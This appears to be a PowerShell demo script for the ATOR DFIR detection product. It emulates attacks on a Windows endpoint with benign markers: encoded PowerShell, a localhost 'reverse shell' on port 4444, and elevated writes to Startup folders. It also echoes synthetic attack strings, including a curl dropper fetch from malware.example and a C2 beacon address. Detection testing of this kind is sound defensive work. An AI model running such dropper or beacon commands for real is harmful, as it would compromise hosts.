<#
.SYNOPSIS
    Demonstrate ATOR DFIR detection capabilities on a Windows endpoint.

.DESCRIPTION
    Puts the repo's own benign test signals on this host and lets the normal
    agent collection + server engine turn them into real detections:

      1. Deploys the project YARA rules into the running agent's rules dir so
         the files triage collector starts scanning files with them.
      2. Drops a benign test marker file (ATOR_DFIR_TEST_FILE_MARKER_X7Q9) in
         the temp + startup folders the triage collector watches. The repo rule
         ATOR_DFIR_Eicar_Style_Test_File flags it  -> YARA detection.
      3. Registers the marker file's SHA-256 as a hash IOC on the server
         via POST /api/v1/iocs                                  -> IOC detection.
      4. Starts a long-lived `powershell -EncodedCommand` and a fake TCP
         connection toward 127.0.0.1:4444 (server-side python listener) so the
         60s process/network collectors capture them.
                                                    -> Sigma detections.
         (power_shell_encoded_command, reverse_shell_ports)
      5. Creates harmless scenario markers spanning the attack kill chain:
         phishing-link click / attachment (initial access), malware dropper
         (execution), spyware/keylogger (collection), botnet C2 beacon
         (command & control), ransomware encryption (impact), and suspected
         intentional internal execution. These are synthetic marker strings
         only: no link is opened, nothing is downloaded, nothing is encrypted.
      6. Forces a server-side engine scan after collection so detections appear
         in the dashboard without waiting for a background scan.

    Every change is temporary. Run with -Cleanup to undo everything:
    - kills the encoded powershell + fake 4444 connection/listener
    - deletes the marker files
    - removes the demo hash IOC from the server watchlist
    (YARA rule files are left in place - they are what makes scanning work,
     and deleting them is optional.)

.PARAMETER AgentRoot
    Path to the installed agent bundle. Defaults to C:\ator-agent.

.PARAMETER ServerUrl
    Base URL of the ATOR DFIR server. Defaults to http://127.0.0.1:8000.

.PARAMETER DbPath
    Direct sqlite path to the server DB, used for cleanup. Defaults to the
    project ator_dfir.db next to this script's project root.

.PARAMETER HoldSeconds
    How long to keep the demo signals alive. Defaults to 150 seconds.
    Must be >= the agent collection interval so a snapshot catches them.

.PARAMETER CleanupAfterMinutes
    Automatically remove demo-only endpoint data after this many minutes.
    Defaults to 3 minutes.

.PARAMETER Cleanup
    Revert everything created by a previous run.

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File scripts\demo_windows_capabilities.ps1

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File scripts\demo_windows_capabilities.ps1 -Cleanup
#>
param(
    [string]$AgentRoot = "C:\ator-agent",
    [string]$ServerUrl = "http://127.0.0.1:8000",
    [string]$DbPath = "",
    [int]$HoldSeconds = 150,
    [int]$CleanupAfterMinutes = 3,
    [switch]$Cleanup
)

$ErrorActionPreference = "Stop"

$MARKER = "ATOR_DFIR_TEST_FILE_MARKER_X7Q9"
$DEMO_PREFIX = "ator-demo"
$MARKER_FILE_NAME = "ator_demo_marker_x7q9.txt"
$TROJAN_FILE_NAME = "ator_demo_trojan_payload.txt"
$PORT = 4444
$DemoHostname = $null
$DemoHostId = $null
$DemoIocSource = $null
$DemoStartedUtc = $null
$DemoPids = New-Object System.Collections.Generic.List[int]
$NewAgentYaraFiles = New-Object System.Collections.Generic.List[string]

function Log($msg) { Write-Host "[ator-demo] $msg" }

# ---------------------------------------------------------------- paths ----
# Project root = parent of this script's directory (scripts\demo_....ps1)
$ScriptDir = $PSScriptRoot
$ProjectRoot = Split-Path -Parent $ScriptDir
if (-not $DbPath) { $DbPath = Join-Path $ProjectRoot "ator_dfir.db" }

$AgentYaraDir    = Join-Path $AgentRoot "rules\malware"
$ProjectYaraDir  = Join-Path $ProjectRoot "rules\malware"

# ------------------------------------------------------------- helpers ----
function Wait-Health {
    for ($i = 0; $i -lt 30; $i++) {
        try {
            $r = Invoke-RestMethod -Uri "$ServerUrl/health" -TimeoutSec 3
            if ($r.status -eq "ok") { return $true }
        } catch { Start-Sleep 1 }
    }
    return $false
}

function Resolve-DemoHost {
    $python = Join-Path $ProjectRoot ".venv\Scripts\python.exe"
    if (-not (Test-Path $python)) { $python = "python.exe" }
    $helper = Join-Path $ProjectRoot "scripts\demo_host.py"
    $result = & $python $helper resolve `
        --config (Join-Path $AgentRoot "agent\config.json") --db $DbPath
    if ($LASTEXITCODE -ne 0 -or -not $result) {
        Write-Error "could not resolve the enrolled endpoint from $AgentRoot\agent\config.json"
    }
    $resolvedHost = $result | ConvertFrom-Json
    $script:DemoHostId = [int]$resolvedHost.id
    $script:DemoHostname = [string]$resolvedHost.hostname
    $script:DemoIocSource = "$DEMO_PREFIX-$($DemoHostname.ToLowerInvariant())"
    Log "using enrolled endpoint '$DemoHostname' (host id $DemoHostId)"
}

function Wait-ForDemoCollection {
    $python = Join-Path $ProjectRoot ".venv\Scripts\python.exe"
    if (-not (Test-Path $python)) { $python = "python.exe" }
    $helper = Join-Path $ProjectRoot "scripts\demo_host.py"
    for ($i = 0; $i -lt 30; $i++) {
        $count = & $python $helper collections `
            --db $DbPath --host-id $DemoHostId --since $DemoStartedUtc
        if ([int]$count -gt 0) {
            Log "agent collection received for '$DemoHostname'"
            return
        }
        Start-Sleep -Seconds 5
    }
    Write-Error "no post-demo agent collection reached the server for '$DemoHostname'; check the ATOR Agent Loop task and agent logs"
}

function Purge-DemoData {
    $purger = Join-Path $ProjectRoot "scripts\purge_demo_data.py"
    $python = Join-Path $ProjectRoot ".venv\Scripts\python.exe"
    if (-not (Test-Path $python)) { $python = "python.exe" }
    $arguments = @($purger, "--db", $DbPath, "--hostname", $DemoHostname,
        "--marker-name", "ator_demo_", "--ioc-source", $DemoIocSource,
        "--port", $PORT)
    foreach ($demoPid in $DemoPids) {
        $arguments += @("--process-pid", $demoPid)
    }
    & $python @arguments
    if ($LASTEXITCODE -ne 0) { Write-Error "demo data purge failed with exit code $LASTEXITCODE" }
    Log "demo-only project data purged"
}

function Remove-DemoYaraFiles {
    foreach ($path in $NewAgentYaraFiles) {
        Remove-Item $path -Force -ErrorAction SilentlyContinue
    }
    if ($NewAgentYaraFiles.Count -gt 0) {
        Log "removed $($NewAgentYaraFiles.Count) demo-deployed YARA rule file(s)"
    }
}

function Add-DemoIoc($type, $value, $source) {
    $body = @{ ioc_type = $type; value = $value; threat_source = $source; description = "ATOR demo indicator (cleanup deletes it)" } | ConvertTo-Json
    Invoke-RestMethod -Uri "$ServerUrl/api/v1/iocs" -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10 | Out-Null
}

function Invoke-ElevatedMarker($action) {
    # The agent loop runs as SYSTEM, so its files_triage only scans SYSTEM paths
    # (C:\Windows\Temp, ProgramData Startup). Those need admin to write, so we
    # elevate a tiny helper that creates or deletes the marker there.
    $helper = Join-Path $env:TEMP "ator_demo_elevated_marker.ps1"
    $marker = $MARKER
    if ($action -eq "create") {
        $body = @"
Set-Content -Path 'C:\Windows\Temp\$MARKER_FILE_NAME' -Value "ATOR DFIR benign demo marker $MARKER`n" -Encoding ASCII -Force
`$pd = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
New-Item -ItemType Directory -Force -Path `$pd | Out-Null
Set-Content -Path (Join-Path `$pd '$MARKER_FILE_NAME') -Value "ATOR DFIR benign demo marker $MARKER`n" -Encoding ASCII -Force
"@
    } else {
        $body = @"
Remove-Item -Path 'C:\Windows\Temp\$MARKER_FILE_NAME' -Force -ErrorAction SilentlyContinue
Remove-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\$MARKER_FILE_NAME' -Force -ErrorAction SilentlyContinue
"@
    }
    Set-Content -Path $helper -Value $body -Encoding ASCII
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File",$helper -Wait
    Remove-Item $helper -Force -ErrorAction SilentlyContinue
    Log "elevated marker action '$action' complete"
}

function Remove-DemoIoc($type, $value) {
    if (-not (Test-Path $DbPath)) { Log "skip IOC removal - DB not found"; return }
    & "$ProjectRoot\.venv\Scripts\python.exe" -c @"
import sqlite3
conn = sqlite3.connect(r'$DbPath', timeout=30)
conn.execute("DELETE FROM ioc_store WHERE ioc_type=? AND value=?", ('$type', r'$value'))
conn.commit(); conn.close()
"@
}

function Get-Sha256($path) {
    $h = (Get-FileHash -Algorithm SHA256 -Path $path).Hash.ToLower()
    return $h
}

function Demo-EncodedPowerShell {
    # Long-lived encoded powershell: `Start-Sleep` for HoldSeconds.
    # No -w hidden, no download cradle: harmless but matches the high-severity rule.
    $code = "Start-Sleep -Seconds $HoldSeconds"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
    $enc = [Convert]::ToBase64String($bytes)
    $ps = Start-Process powershell.exe -ArgumentList "-NoProfile","-WindowStyle","Normal","-EncodedCommand",$enc -WindowStyle Normal -PassThru
    $DemoPids.Add($ps.Id)
    Set-Content -Path (Join-Path $env:TEMP "ator_demo_powershell.pid") -Value $ps.Id
    Log "started encoded powershell (pid $($ps.Id)) for $HoldSeconds s"
}

function Demo-ReverseShellPort {
    # Server-side listener on 4444 so the "reverse shell" connection is real.
    # Written to a temp .py file (inline -c via Start-Process can mangle args).
    $py = Join-Path $AgentRoot ".venv\Scripts\python.exe"
    if (-not (Test-Path $py)) { $py = Join-Path $ProjectRoot ".venv\Scripts\python.exe" }
    $listenerScript = Join-Path $env:TEMP "ator_demo_listener.py"
    $ls = @"
import socket, time
s = socket.socket()
s.bind(('127.0.0.1', $PORT))
s.listen(5)
c, a = s.accept()
time.sleep($HoldSeconds)
c.close(); s.close()
"@
    Set-Content -Path $listenerScript -Value $ls -Encoding ASCII
    $listener = Start-Process $py -ArgumentList $listenerScript -WindowStyle Hidden -PassThru
    Start-Sleep 2
    # Client: hold a real TCP connection to 127.0.0.1:4444. Encoded so no quoting issues.
    $clientCode = "`$c=New-Object System.Net.Sockets.TcpClient('127.0.0.1',$PORT); Start-Sleep -Seconds $HoldSeconds; `$c.Close()"
    $b = [System.Text.Encoding]::Unicode.GetBytes($clientCode)
    $encClient = [Convert]::ToBase64String($b)
    $ps = Start-Process powershell.exe -ArgumentList "-NoProfile","-WindowStyle","Hidden","-EncodedCommand",$encClient -WindowStyle Hidden -PassThru
    $DemoPids.Add($ps.Id)
    Set-Content -Path (Join-Path $env:TEMP "ator_demo_listener.pid") -Value $listener.Id
    Set-Content -Path (Join-Path $env:TEMP "ator_demo_reverse.pid")   -Value $ps.Id
    Log "started fake reverse shell: listener pid $($listener.Id), client pid $($ps.Id) on port $PORT"
}

function Demo-ScenarioProcess($marker, $label) {
    $code = "Write-Output '$marker'; Start-Sleep -Seconds $HoldSeconds"
    $ps = Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", $code `
        -WindowStyle Hidden -PassThru
    $DemoPids.Add($ps.Id)
    Log "started synthetic $label scenario (pid $($ps.Id))"
}

function Invoke-DemoEngineScan {
    try {
        $result = Invoke-RestMethod -Uri "$ServerUrl/api/v1/engine/run?scan_history=true" `
            -Method Post -TimeoutSec 120
        Log ("engine scan completed: " + ($result | ConvertTo-Json -Compress))
    } catch {
        Write-Error "demo engine scan failed: $($_.Exception.Message)"
    }
}

# ---------------------------------------------------------------------------
# CLEANUP
# ---------------------------------------------------------------------------
if ($Cleanup) {
    Log "reverting demo..."
    $TEMPPidTemplate = Join-Path $env:TEMP "ator_demo_*.pid"
    Get-ChildItem -Path $TEMPPidTemplate -ErrorAction SilentlyContinue | ForEach-Object {
        $name = $_.BaseName
        $pidList = Get-Content $_.FullName -ErrorAction SilentlyContinue
        foreach ($p in $pidList) {
            if ($p -match '^\d+$') {
                try { Stop-Process -Id ([int]$p) -Force -ErrorAction SilentlyContinue }
                catch { }
                Log "killed $name pid $p"
            }
        }
        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    }

    # marker files - in SYSTEM-scanned paths (agent runs as SYSTEM) and user paths
    Invoke-ElevatedMarker "remove"
    Remove-Item (Join-Path $env:TEMP "ator_demo_listener.py") -Force -ErrorAction SilentlyContinue
    $markers = @()
    if ($env:TEMP) { $markers += (Join-Path $env:TEMP $MARKER_FILE_NAME) }
    $startup = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
    $markers += (Join-Path $startup $MARKER_FILE_NAME)
    foreach ($m in $markers) {
        if (Test-Path $m) { Remove-Item $m -Force; Log "removed marker $m" }
    }
    # remove the demo hash IOC and any matching collected demo evidence
    if (Test-Path $DbPath) {
        $python = Join-Path $ProjectRoot ".venv\Scripts\python.exe"
        if (-not (Test-Path $python)) { $python = "python.exe" }
        & $python (Join-Path $ProjectRoot "scripts\purge_demo_data.py") `
            --db $DbPath --hostname $DemoHostname --marker-name "ator_demo_" `
            --ioc-source $DemoIocSource --port $PORT
    }
    Remove-DemoYaraFiles
    Log "cleanup done. Existing YARA rules were left untouched."
    exit 0
}

# ---------------------------------------------------------------------------
# DEPLOY + TRIGGER
# ---------------------------------------------------------------------------
Log "checking $ServerUrl ..."
if (-not (Wait-Health)) { Write-Error "server not reachable at $ServerUrl"; exit 1 }
Resolve-DemoHost
$DemoStartedUtc = [DateTime]::UtcNow.ToString("o")

# 1) deploy yara rules
if (Test-Path $ProjectYaraDir) {
    New-Item -ItemType Directory -Force -Path $AgentYaraDir | Out-Null
    Get-ChildItem -Path $ProjectYaraDir -Filter "*.yar" -File | ForEach-Object {
        $target = Join-Path $AgentYaraDir $_.Name
        if (-not (Test-Path $target)) { $NewAgentYaraFiles.Add($target) }
        Copy-Item -Path $_.FullName -Destination $target -Force
    }
    Log "deployed YARA rules to $AgentYaraDir"
} else {
    Log "WARN project rules dir not found: $ProjectYaraDir"
}

# 2) marker files - SYSTEM-scanned (Windows\Temp, ProgramData Startup) via elevation,
#    plus user paths. The hash IOC is derived from the SYSTEM copy so the collector's
#    snapshot matches the registered hash.
Invoke-ElevatedMarker "create"
$markers = @()
if ($env:TEMP) { $markers += (Join-Path $env:TEMP $MARKER_FILE_NAME) }
$startup = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -ItemType Directory -Force -Path $startup | Out-Null
$markers += (Join-Path $startup $MARKER_FILE_NAME)
foreach ($m in $markers) {
    Set-Content -Path $m -Value "ATOR DFIR benign demo marker $MARKER`n" -Encoding ASCII
    Log "wrote marker -> $m"
}
$trojanPath = Join-Path $env:TEMP $TROJAN_FILE_NAME
Set-Content -Path $trojanPath -Value @"
ATOR_DEMO_TROJAN_PAYLOAD
ATOR_DEMO_EMAIL_ATTACHMENT_OPENED
This is a benign text marker for the ATOR DFIR demonstration.
"@ -Encoding ASCII
Log "wrote synthetic trojan/attachment marker -> $trojanPath"
$markerPath = Join-Path "C:\Windows\Temp" $MARKER_FILE_NAME
if (-not (Test-Path $markerPath)) { $markerPath = $markers[0] }
$sha = Get-Sha256 $markerPath

# 3) hash IOC for marker file
Add-DemoIoc "hash" $sha $DemoIocSource
Log "registered marker sha256 $($sha.Substring(0,16))... as hash IOC"

# 4) sigma triggers
Demo-EncodedPowerShell
Demo-ReverseShellPort
Demo-ScenarioProcess "ATOR_DEMO_PHISHING_LINK_CLICKED url=https://demo.invalid/phishing" "phishing-link click"
Demo-ScenarioProcess "ATOR_DEMO_EMAIL_ATTACHMENT_OPENED file=$TROJAN_FILE_NAME" "email attachment"
Demo-ScenarioProcess "ATOR_DEMO_MALWARE_DROPPER curl http://malware.example/dropper.exe -o payload.exe" "malware dropper"
Demo-ScenarioProcess "ATOR_DEMO_SPYWARE_KEYLOGGER capture=keystrokes out=AppData\.cache.log" "spyware/keylogger"
Demo-ScenarioProcess "ATOR_DEMO_BOTNET_BEACON c2=198.51.100.66:4444 interval=30s" "botnet/C2 beacon"
Demo-ScenarioProcess "ATOR_DEMO_RANSOMWARE_ENCRYPT ext=.locked note=READ_ME_TO_DECRYPT.txt" "ransomware"
Demo-ScenarioProcess "ATOR_DEMO_INTERNAL_EXECUTION operator=demo" "internal execution"

Log "all demo signals deployed. Waiting $HoldSeconds s for the agent collectors to snapshot them..."
Start-Sleep $HoldSeconds
Wait-ForDemoCollection
Log "Hold window finished. The next agent collection (every 60s) + engine will turn these into detections."
try {
    $result = Invoke-RestMethod -Uri "$ServerUrl/api/v1/engine/run?host_id=$DemoHostId&scan_history=true" `
        -Method Post -TimeoutSec 120
    Log ("engine scan completed: " + ($result | ConvertTo-Json -Compress))
} catch {
    Write-Error "demo engine scan failed: $($_.Exception.Message)"
}
Log "Check the dashboard now: $ServerUrl/"

$remaining = ($CleanupAfterMinutes * 60) - $HoldSeconds
if ($remaining -gt 0) {
    Log "Demo data will be removed automatically in $CleanupAfterMinutes minutes total."
    Start-Sleep $remaining
}

Purge-DemoData
Invoke-ElevatedMarker "remove"
foreach ($m in @(
    (Join-Path $env:TEMP $MARKER_FILE_NAME),
    (Join-Path $env:TEMP $TROJAN_FILE_NAME),
    (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\$MARKER_FILE_NAME")
)) {
    Remove-Item $m -Force -ErrorAction SilentlyContinue
}
Remove-DemoYaraFiles
Remove-Item (Join-Path $env:TEMP "ator_demo_listener.py") -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP "ator_demo_*.pid") -Force -ErrorAction SilentlyContinue
Log "$CleanupAfterMinutes-minute demo window complete; temporary demo signals and collected demo data are gone."